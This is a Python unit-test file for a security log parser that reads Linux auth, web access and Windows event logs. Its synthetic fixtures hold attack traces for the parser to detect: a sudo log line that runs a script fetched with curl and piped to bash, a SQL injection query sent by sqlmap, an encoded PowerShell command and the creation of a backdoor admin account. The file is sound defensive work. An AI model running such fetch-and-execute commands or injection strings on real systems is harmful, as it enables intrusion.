"""Parser and timestamp tests, including lines that must not match."""

from __future__ import annotations

import json
import unittest
from datetime import datetime, timezone

from soclog.parsers.detect import detect_format
from soclog.parsers.linux_auth import parse_linux_auth
from soclog.parsers.web_access import parse_web_access
from soclog.parsers.windows import parse_windows_csv, parse_windows_json
from soclog.timeparse import parse_timestamp


class TimeParseTests(unittest.TestCase):
    def test_iso_z_and_offset_and_long_fraction(self) -> None:
        self.assertEqual(parse_timestamp("2026-10-27T08:15:01Z"), datetime(2026, 10, 27, 8, 15, 1))
        self.assertEqual(
            parse_timestamp("2026-10-27T10:15:01+02:00"),
            datetime(2026, 10, 27, 8, 15, 1),
        )
        parsed = parse_timestamp("2026-10-27T08:15:01.1234567Z")
        self.assertEqual(parsed, datetime(2026, 10, 27, 8, 15, 1, 123456))

    def test_apache_timestamp_converts_to_utc(self) -> None:
        parsed = parse_timestamp("27/Oct/2026:10:30:00 +0200")
        self.assertEqual(parsed, datetime(2026, 10, 27, 8, 30, 0))

    def test_syslog_without_year_uses_previous_year_when_it_is_in_the_future(self) -> None:
        parsed = parse_timestamp("Dec 31 23:00:00", now=datetime(2026, 1, 15, 12, 0, 0))
        self.assertEqual(parsed, datetime(2025, 12, 31, 23, 0, 0))

    def test_syslog_keeps_the_current_year_for_a_recent_month(self) -> None:
        parsed = parse_timestamp(
            "Oct 27 10:00:00",
            now=datetime(2026, 10, 28, 9, 0, 0),
        )
        self.assertEqual(parsed, datetime(2026, 10, 27, 10, 0, 0))

    def test_explicit_year_does_not_roll_back(self) -> None:
        parsed = parse_timestamp("Dec 31 23:00:00", default_year=2026, now=datetime(2026, 1, 15))
        self.assertEqual(parsed, datetime(2026, 12, 31, 23, 0, 0))

    def test_dotnet_date_and_garbage(self) -> None:
        moment = datetime(2026, 10, 27, 8, 0, tzinfo=timezone.utc)
        millis = int(moment.timestamp() * 1000)
        parsed = parse_timestamp(f"/Date({millis})/")
        self.assertEqual(parsed, datetime(2026, 10, 27, 8, 0, 0))
        with self.assertRaises(ValueError):
            parse_timestamp("not a time")


class LinuxAuthTests(unittest.TestCase):
    def test_failed_password_invalid_user_and_accepted_methods(self) -> None:
        text = "\n".join(
            [
                "Oct 27 14:00:00 web01 sshd[10]: Failed password for invalid user alpha from 203.0.113.20 port 22 ssh2",
                "Oct 27 14:05:00 web01 sshd[11]: Failed password for root from 203.0.113.10 port 40001 ssh2",
                "Oct 27 15:00:00 web01 sshd[12]: Accepted publickey for deploy from 192.0.2.10 port 52022 ssh2",
                "Oct 27 15:01:00 web01 sshd[13]: Accepted password for ops from 192.0.2.25 port 22 ssh2",
            ]
        )
        events, unparsed = parse_linux_auth(text, default_year=2026)
        self.assertEqual(unparsed, 0)
        self.assertEqual([event.event_type for event in events], ["ssh_failed", "ssh_failed", "ssh_success", "ssh_success"])
        self.assertEqual(events[0].user, "alpha")
        self.assertEqual(events[0].src_ip, "203.0.113.20")
        self.assertEqual(events[2].user, "deploy")
        self.assertEqual(events[0].timestamp, datetime(2026, 10, 27, 14, 0, 0))

    def test_sudo_useradd_usermod_and_ignored_lines(self) -> None:
        text = "\n".join(
            [
                "2026-10-27T09:05:00Z web01 sudo[2210]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx",
                "2026-10-27T11:02:00Z web01 sudo[1502]: pam_unix(sudo:session): session opened for user root by ops(uid=1000)",
                "2026-10-27T18:00:00Z web01 useradd[3101]: new user: name=svcbackup, UID=1007, GID=1007, home=/home/svcbackup, shell=/bin/bash",
                "2026-10-27T18:00:05Z web01 usermod[3102]: add 'svcbackup' to group 'sudo'",
                "2026-10-27T18:00:06Z web01 usermod[3102]: add 'svcbackup' to shadow group 'sudo'",
                "2026-10-27T18:05:00Z web01 sudo[3200]: www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c curl -fsSL http://203.0.113.80/setup.sh | bash",
                "# comment",
                "",
                "this is not a syslog line",
                "2026-10-27T09:00:00Z web01 CRON[900]: pam_unix(cron:session): session opened for user root",
            ]
        )
        events, unparsed = parse_linux_auth(text)
        kinds = [(event.event_type, event.user, event.group, event.command) for event in events]
        self.assertEqual(
            kinds,
            [
                ("sudo_command", "deploy", None, "/usr/bin/systemctl status nginx"),
                ("user_created", "svcbackup", None, None),
                ("group_membership", "svcbackup", "sudo", None),
                (
                    "sudo_command",
                    "www-data",
                    None,
                    "/bin/bash -c curl -fsSL http://203.0.113.80/setup.sh | bash",
                ),
            ],
        )
        self.assertEqual(unparsed, 1)

    def test_loopback_ssh_source_is_dropped(self) -> None:
        text = "2026-10-27T09:00:00Z web01 sshd[1]: Failed password for root from 127.0.0.1 port 22 ssh2\n"
        events, unparsed = parse_linux_auth(text)
        self.assertEqual(unparsed, 0)
        self.assertIsNone(events[0].src_ip)


class WebAccessTests(unittest.TestCase):
    def test_combined_log_keeps_query_status_and_user_agent(self) -> None:
        line = (
            '203.0.113.50 - admin [27/Oct/2026:12:00:00 +0000] '
            '"GET /search?q=1%27%20OR%201%3D1 HTTP/1.1" 500 400 "-" "sqlmap/1.7"'
        )
        events, unparsed = parse_web_access(line + "\n# comment\n\n")
        self.assertEqual(unparsed, 0)
        self.assertEqual(len(events), 1)
        event = events[0]
        self.assertEqual(event.src_ip, "203.0.113.50")
        self.assertEqual(event.user, "admin")
        self.assertEqual(event.path, "/search?q=1%27%20OR%201%3D1")
        self.assertEqual(event.status, 500)
        self.assertEqual(event.user_agent, "sqlmap/1.7")
        self.assertEqual(event.timestamp, datetime(2026, 10, 27, 12, 0, 0))

    def test_common_log_without_user_agent_is_unparsed(self) -> None:
        line = '203.0.113.10 - - [27/Oct/2026:10:00:00 +0000] "GET / HTTP/1.1" 200 100\n'
        events, unparsed = parse_web_access(line)
        self.assertEqual(events, [])
        self.assertEqual(unparsed, 1)

    def test_dash_user_is_absent(self) -> None:
        line = (
            '192.0.2.10 - - [27/Oct/2026:09:00:00 +0000] '
            '"GET / HTTP/1.1" 200 10 "-" "Mozilla/5.0"\n'
        )
        events, _ = parse_web_access(line)
        self.assertIsNone(events[0].user)


class WindowsParserTests(unittest.TestCase):
    def test_json_list_logon_types_and_noise_accounts(self) -> None:
        payload = [
            {
                "EventID": 4625,
                "TimeCreated": "2026-10-27T13:00:00.1234567Z",
                "TargetUserName": "Administrator",
                "IpAddress": "::ffff:203.0.113.40",
                "LogonType": 3,
            },
            {
                "Id": 4624,
                "TimeCreated": "2026-10-27T09:15:00Z",
                "TargetUserName": "ops",
                "IpAddress": "192.0.2.25",
                "LogonType": "3",
            },
            {
                "EventID": 4624,
                "TimeCreated": "2026-10-27T09:16:00Z",
                "TargetUserName": "SYSTEM",
                "LogonType": 5,
            },
            {
                "EventID": 4624,
                "TimeCreated": "2026-10-27T09:17:00Z",
                "TargetUserName": "WIN-DEMO$",
                "IpAddress": "192.0.2.5",
                "LogonType": 3,
            },
            {"EventID": 4672, "TimeCreated": "2026-10-27T09:18:00Z", "SubjectUserName": "ops"},
        ]
        events, unparsed = parse_windows_json(json.dumps(payload))
        self.assertEqual(unparsed, 0)
        self.assertEqual([event.event_type for event in events], ["win_logon_failed", "win_logon_success"])
        self.assertEqual(events[0].src_ip, "203.0.113.40")
        self.assertEqual(events[0].event_id, 4625)

    def test_wrapper_ndjson_message_and_account_events(self) -> None:
        message = "\n".join(
            [
                "An account failed to log on.",
                "Subject:",
                "    Account Name: -",
                "Logon Type: 3",
                "Account For Which Logon Failed:",
                "    Account Name: administrator",
                "Failure Information:",
                "Network Information:",
                "    Source Network Address: 203.0.113.40",
            ]
        )
        wrapper = {
            "comment": "SYNTHETIC",
            "events": [
                {
                    "EventID": 4625,
                    "TimeCreated": "2026-10-27T13:00:00Z",
                    "IpAddress": "-",
                    "Message": message,
                },
                {"EventID": 4720, "TimeCreated": "2026-10-27T18:10:00Z", "TargetUserName": "svcbackup", "SubjectUserName": "Administrator"},
                {
                    "EventID": 4732,
                    "TimeCreated": "2026-10-27T18:11:00Z",
                    "MemberName": "svcbackup",
                    "GroupName": "Administrators",
                    "SubjectUserName": "Administrator",
                },
                {
                    "EventID": 4728,
                    "TimeCreated": "2026-10-27T18:12:00Z",
                    "MemberName": "svcbackup",
                    "TargetUserName": "Domain Admins",
                },
                {
                    "EventID": 4688,
                    "TimeCreated": "2026-10-27T18:20:00Z",
                    "SubjectUserName": "Administrator",
                    "CommandLine": "powershell.exe -EncodedCommand QQBjAG0AZQA=",
                },
                {"EventID": 1102, "TimeCreated": "2026-10-27T18:30:00Z", "SubjectUserName": "Administrator"},
                "not-an-object",
            ],
        }
        events, unparsed = parse_windows_json(json.dumps(wrapper))
        self.assertEqual(unparsed, 1)
        self.assertEqual(events[0].user, "administrator")
        self.assertEqual(events[0].src_ip, "203.0.113.40")
        self.assertEqual(
            [event.event_type for event in events],
            [
                "win_logon_failed",
                "win_user_created",
                "group_membership",
                "group_membership",
                "process",
                "audit_log_cleared",
            ],
        )
        self.assertEqual(events[2].group, "Administrators")
        self.assertEqual(events[3].group, "Domain Admins")
        self.assertEqual(events[5].user, "Administrator")

        ndjson = "\n".join(
            [
                '{"EventID": 1102, "TimeCreated": "2026-10-27T01:00:00Z", "SubjectUserName": "Administrator"}',
                '{"EventID": 1102, "TimeCreated": "2026-10-27T02:00:00Z"}',
                "not json",
            ]
        )
        nd_events, nd_unparsed = parse_windows_json(ndjson)
        self.assertEqual(len(nd_events), 2)
        self.assertEqual(nd_unparsed, 1)

    def test_csv_header_variants_and_dotnet_time(self) -> None:
        moment = datetime(2026, 10, 27, 8, 0, tzinfo=timezone.utc)
        millis = int(moment.timestamp() * 1000)
        text = "\n".join(
            [
                "# SYNTHETIC",
                "Time Created,Event ID,Computer,Account Name,Source IP,Command Line",
                f"/Date({millis})/,4688,win-demo,ops,192.0.2.25,notepad.exe",
                "",
            ]
        )
        events, unparsed = parse_windows_csv("\ufeff" + text)
        self.assertEqual(unparsed, 0)
        self.assertEqual(events[0].event_type, "process")
        self.assertEqual(events[0].command, "notepad.exe")
        self.assertEqual(events[0].timestamp, datetime(2026, 10, 27, 8, 0, 0))
        self.assertEqual(events[0].source_format, "windows-csv")

    def test_record_without_a_timestamp_is_unparsed(self) -> None:
        events, unparsed = parse_windows_json('[{"EventID": 4625, "TargetUserName": "ops"}]')
        self.assertEqual(events, [])
        self.assertEqual(unparsed, 1)


class DetectFormatTests(unittest.TestCase):
    def test_each_format_and_the_failures(self) -> None:
        self.assertEqual(
            detect_format(
                "2026-10-27T09:00:00Z web01 sshd[1]: Failed password for root from 203.0.113.10 port 22 ssh2\n"
            ),
            "linux-auth",
        )
        self.assertEqual(
            detect_format(
                '203.0.113.10 - - [27/Oct/2026:09:00:00 +0000] "GET / HTTP/1.1" 200 1 "-" "Mozilla/5.0"\n'
            ),
            "web-access",
        )
        self.assertEqual(
            detect_format('{"events": [{"EventID": 1102, "TimeCreated": "2026-10-27T00:00:00Z"}]}'),
            "windows-json",
        )
        self.assertEqual(
            detect_format(
                '{"EventID": 1102, "TimeCreated": "2026-10-27T00:00:00Z"}\n'
                '{"EventID": 1102, "TimeCreated": "2026-10-27T00:01:00Z"}\n'
            ),
            "windows-json",
        )
        self.assertEqual(
            detect_format("# comment\nTimeCreated,EventID,Computer\n2026-10-27T00:00:00Z,1102,win-demo\n"),
            "windows-csv",
        )
        with self.assertRaises(ValueError):
            detect_format("")
        with self.assertRaises(ValueError):
            detect_format("hello\nthis is not a log\n")
        mixed = "\n".join(
            [
                "2026-10-27T09:00:00Z web01 sshd[1]: Accepted password for ops from 192.0.2.10 port 22 ssh2",
                '192.0.2.10 - - [27/Oct/2026:09:00:00 +0000] "GET / HTTP/1.1" 200 1 "-" "Mozilla/5.0"',
            ]
        )
        with self.assertRaises(ValueError):
            detect_format(mixed)


if __name__ == "__main__":
    unittest.main()
